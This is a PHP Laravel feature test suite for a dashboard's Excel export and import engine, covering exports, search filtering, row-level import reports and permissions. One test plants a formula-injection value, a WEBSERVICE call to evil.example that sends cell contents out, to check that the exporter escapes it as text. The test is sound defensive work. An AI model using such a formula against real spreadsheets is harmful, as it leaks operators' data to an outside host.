<?php

namespace Tests\Feature\Dashboard;

use App\Modules\City\Models\City;
use App\Modules\Driver\Models\DriverApplication;
use App\Support\Spreadsheet\Exporter;
use App\Support\Spreadsheet\SheetRegistry;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Cache;
use OpenSpout\Common\Entity\Row;
use OpenSpout\Reader\XLSX\Reader;
use OpenSpout\Writer\XLSX\Writer;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;

/**
 * Excel export and import, through the engine every sheet shares — exercised
 * on the cities sheet.
 *
 * The properties that matter: an export holds what the list holds; an import
 * validates each row with the screen's own form and stores it through the
 * screen's own service; a good row is saved while a bad one is reported with
 * its row number; a blank cell never blanks a field; and the permissions are
 * the screen's own.
 */
class SpreadsheetTest extends TestCase
{
    use RefreshDatabase;

    /** @var array<string, mixed> */
    private array $geo;

    protected function setUp(): void
    {
        parent::setUp();
        Cache::flush();
        $this->seedCore();
        $this->geo = $this->seedGeo();
    }

    /**
     * @param  array<int, array<int, mixed>>  $rows  the first row is the headers
     */
    private function xlsx(array $rows): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'test').'.xlsx';
        $writer = new Writer;
        $writer->openToFile($path);

        foreach ($rows as $row) {
            $writer->addRow(Row::fromValues($row));
        }

        $writer->close();

        return new UploadedFile($path, 'sheet.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', null, true);
    }

    /**
     * @return array<int, array<int, mixed>>
     */
    private function read(string $path): array
    {
        $reader = new Reader;
        $reader->open($path);
        $rows = [];

        foreach ($reader->getSheetIterator() as $sheet) {
            foreach ($sheet->getRowIterator() as $row) {
                $rows[] = $row->toArray();
            }

            break;
        }

        $reader->close();

        return $rows;
    }

    private function city(): City
    {
        return $this->geo['city'];
    }

    #[Test]
    public function every_screen_sheet_is_found_and_well_formed(): void
    {
        $registry = app(SheetRegistry::class);

        $this->assertTrue($registry->has('city'));

        foreach (array_keys($registry->all()) as $key) {
            $sheet = $registry->find($key);

            $this->assertSame($key, $sheet->key());
            $this->assertNotEmpty($sheet->columns(), "{$key} has no columns");
            $this->assertSame(count($sheet->headers()), count(array_unique($sheet->headers())), "{$key} repeats a header");

            if ($sheet->importable()) {
                $this->assertNotNull($sheet->request(), "{$key} imports without a form to validate by");
            }
        }
    }

    #[Test]
    public function an_export_holds_what_the_list_holds(): void
    {
        $response = $this->actingAs($this->superAdmin())->get(route('admin.spreadsheet.export', 'city'));

        $response->assertOk();
        $this->assertStringContainsString('spreadsheetml', (string) $response->headers->get('Content-Type'));

        $rows = $this->read($response->getFile()->getPathname());

        $this->assertSame(['id', 'name_en', 'name_ar', 'country_id', 'country', 'lat', 'lng', 'status'], $rows[0]);
        $this->assertSame(City::count() + 1, count($rows));
        $this->assertContains($this->city()->name->en, array_column($rows, 1));
    }

    #[Test]
    public function a_searched_export_holds_only_the_rows_the_search_found(): void
    {
        $other = City::create([
            'name' => json_encode(['en' => 'Alexandria', 'ar' => 'الإسكندرية'], JSON_UNESCAPED_UNICODE),
            'country_id' => $this->city()->country_id, 'status' => 'active',
        ]);

        $this->actingAs($this->superAdmin());
        $sheet = app(SheetRegistry::class)->find('city');
        $path = app(Exporter::class)->write($sheet, $sheet->filter($sheet->query(), ['query' => 'alexan']));

        $rows = $this->read($path);
        $this->assertCount(2, $rows);
        $this->assertSame($other->id, (int) $rows[1][0]);
    }

    #[Test]
    public function a_value_that_looks_like_a_formula_is_exported_as_text(): void
    {
        // A public driver application, named to run in the operator's Excel.
        $formula = '=WEBSERVICE("https://evil.example/?"&B3&C3)';
        DriverApplication::create([
            'name' => $formula, 'phone' => '+201099887766', 'note' => '=1+1',
        ]);

        $this->actingAs($this->superAdmin());
        $sheet = app(SheetRegistry::class)->find('driver_application');
        $path = app(Exporter::class)->write($sheet, $sheet->query());

        // No formula anywhere in the worksheet — only text.
        $zip = new \ZipArchive;
        $this->assertTrue($zip->open($path) === true);
        $xml = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();

        $this->assertStringNotContainsString('<f>', $xml);

        // And the text is what was typed, character for character.
        $this->assertContains($formula, array_merge(...$this->read($path)));
    }

    #[Test]
    public function the_template_is_the_headers_alone(): void
    {
        $response = $this->actingAs($this->superAdmin())->get(route('admin.spreadsheet.template', 'city'));

        $response->assertOk();
        $this->assertCount(1, $this->read($response->getFile()->getPathname()));
    }

    #[Test]
    public function an_import_adds_changes_and_reports_row_by_row(): void
    {
        $countryId = $this->city()->country_id;

        $file = $this->xlsx([
            ['id', 'name_en', 'name_ar', 'country_id', 'country', 'lat', 'lng', 'status'],
            // Row 2: new.
            [null, 'Giza', 'الجيزة', $countryId, 'ignored', 30.01, 31.2, 'active'],
            // Row 3: an edit — English only, so the Arabic name must survive.
            [$this->city()->id, 'Cairo Renamed', null, null, null, null, null, null],
            // Row 4: refused — the form requires a country for a new city.
            [null, 'Nowhere', null, null, null, null, null, 'active'],
            // Row 5: refused — no such record.
            [999999, 'Ghost', null, null, null, null, null, null],
            // Row 6: empty, skipped silently.
            [null, null, null, null, null, null, null, null],
        ]);

        $this->actingAs($this->superAdmin())
            ->post(route('admin.spreadsheet.import', 'city'), ['file' => $file])
            ->assertRedirect()
            ->assertSessionHas('spreadsheet_report', function (array $report) {
                return $report['created'] === 1
                    && $report['updated'] === 1
                    && array_column($report['failed'], 'row') === [4, 5];
            });

        $giza = City::all()->first(fn (City $c) => ($c->name->en ?? null) === 'Giza');
        $this->assertNotNull($giza);
        $this->assertSame('الجيزة', $giza->name->ar);

        $cairo = $this->city()->fresh();
        $this->assertSame('Cairo Renamed', $cairo->name->en);
        // Untouched by a blank cell.
        $this->assertNotEmpty($cairo->name->ar);
        $this->assertSame('active', $cairo->status);
        $this->assertSame($this->city()->country_id, $cairo->country_id);
    }

    #[Test]
    public function an_import_reports_the_forms_own_words(): void
    {
        $file = $this->xlsx([
            ['id', 'name_en', 'country_id', 'status'],
            [null, 'Bad Status', $this->city()->country_id, 'sometimes'],
        ]);

        $this->actingAs($this->superAdmin())
            ->post(route('admin.spreadsheet.import', 'city'), ['file' => $file])
            ->assertSessionHas('spreadsheet_report', fn (array $report) => $report['failed'][0]['row'] === 2
                && $report['failed'][0]['messages'] !== []);
    }

    #[Test]
    public function exporting_and_importing_answer_to_the_screens_own_permissions(): void
    {
        $tenant = $this->laundryWithOwner('A', '+201011110001', '+201011110002');
        $owner = $tenant['owner'];

        $this->grant('laundry_owner', ['laundry.view']);

        $this->actingAs($owner)->get(route('admin.spreadsheet.export', 'city'))->assertForbidden();
        $this->actingAs($owner)->post(route('admin.spreadsheet.import', 'city'), [
            'file' => $this->xlsx([['id', 'name_en'], [null, 'X']]),
        ])->assertForbidden();

        // Even holding the permissions, somebody inside a laundry never imports
        // into the platform's catalogue.
        $this->grant('laundry_owner', ['city.view', 'city.create', 'city.update']);
        $owner = $owner->fresh();

        $this->actingAs($owner)->get(route('admin.spreadsheet.export', 'city'))->assertOk();
        $this->actingAs($owner)->post(route('admin.spreadsheet.import', 'city'), [
            'file' => $this->xlsx([['id', 'name_en', 'country_id', 'status'], [null, 'Sneaky', $this->city()->country_id, 'active']]),
        ])->assertForbidden();

        $this->assertSame(0, City::all()->filter(fn (City $c) => ($c->name->en ?? null) === 'Sneaky')->count());
    }

    #[Test]
    public function an_unknown_sheet_is_not_found_and_a_non_xlsx_is_refused(): void
    {
        $this->actingAs($this->superAdmin())->get(route('admin.spreadsheet.export', 'nothing_here'))->assertNotFound();

        $this->actingAs($this->superAdmin())
            ->post(route('admin.spreadsheet.import', 'city'), ['file' => UploadedFile::fake()->create('cities.csv', 1, 'text/csv')])
            ->assertSessionHasErrors('file');
    }
}
